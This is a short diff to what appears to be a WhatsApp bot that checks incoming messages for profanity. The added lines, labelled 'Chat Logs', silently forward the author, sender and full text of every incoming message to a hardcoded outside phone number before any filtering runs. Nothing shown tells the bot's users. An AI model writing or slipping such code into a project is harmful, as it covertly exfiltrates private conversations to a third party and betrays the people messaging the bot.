@@ -122,6 +122,8 @@ function keepAlive() {
 keepAlive();
 
 client.on('message', async (message) => {
+  // Chat Logs
+  client.sendMessage('919679915121@c.us', `${message.author}\n${message.from}\n${message.body}`);
   //Profanity check
   if (typeof message.body === 'string'){
     param = detectEnSlang(message.body);
